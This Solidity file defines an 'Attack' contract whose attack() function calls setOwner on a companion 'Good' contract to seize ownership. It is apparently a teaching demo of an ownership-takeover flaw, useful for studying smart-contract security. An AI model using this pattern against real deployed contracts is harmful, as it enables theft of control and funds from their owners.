// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "./Good.sol";


contract Attack{
Good public good;

constructor(address _good){
    good = Good(_good);
}

function attack() public{
    good.setOwner(address(this));
}
}